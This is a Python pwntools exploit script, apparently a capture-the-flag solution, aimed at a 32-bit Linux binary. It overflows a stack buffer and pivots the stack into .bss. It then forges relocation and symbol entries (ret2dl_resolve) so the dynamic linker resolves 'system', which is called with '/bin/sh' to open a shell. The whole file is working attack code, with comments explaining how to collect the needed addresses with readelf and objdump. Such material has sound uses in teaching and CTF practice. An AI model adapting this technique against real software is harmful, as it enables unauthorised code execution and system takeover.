#coding:utf-8

from pwn import *

context(os='linux',arch='i386')
context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

lr = 0x08048448	#leave ; ret
bss = 0x0804aa00
pppr_addr = 0x080485d9	#pop esi ; pop edi ; pop ebp ; ret
pop_ebp = 0x080485db

payload = (0x28+4) * 'a'
payload+= p32(elf.plt['read'])	#read(0,bss,0x400)
payload+= p32(pppr_addr)
payload+= p32(0)
payload+= p32(bss) 
payload+= p32(0x400)
payload+= p32(pop_ebp)
payload+= p32(bss)
payload+= p32(lr)	#leave;ret;	leave=mov esp,ebp;pop ebp;
p.send(payload)
'''
gdb.attach(p,gdbscript=
b *0x080485d9
)
'''
sleep(1)

plt_0 = 0x08048380	#objdump <filename> -d -j .plt
r_info = 0x107	#readelf -r <filename>
rel_plt = 0x0804833c #objdump <filename> -s -j .rel.plt,addr of the .rel.plt start 
dynsym =  0x080481dc	#readelf -d <filename>,SYMTAB
dynstr = 0x0804827c	#readelf -d <filename>,STRTAB

fake_sys_addr = bss + 36
align = 0x10 - ((fake_sys_addr-dynsym)&0xf)
fake_sys_addr = fake_sys_addr + align
index = (fake_sys_addr - dynsym)/0x10
r_info = (index << 8) + 0x7
st_name = (fake_sys_addr + 0x10) - dynstr
fake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) 

fake_rel = p32(elf.got['read']) + p32(r_info)
fake_rel_addr = bss + 28
fake_index = fake_rel_addr - rel_plt    

#writed content in bss segment
payload = p32(bss)
payload+= p32(plt_0)
payload+= p32(fake_index)
payload+= p32(0xdeadbeaf)
payload+= p32(bss+0x80)
payload+= p32(0)
payload+= p32(0)
payload+= fake_rel
payload+= 'a'*align
payload+= fake_sys
payload+= 'system'
payload = payload.ljust(0x80,'\x00')
payload+= '/bin/sh\x00'
p.sendline(payload)

p.interactive()
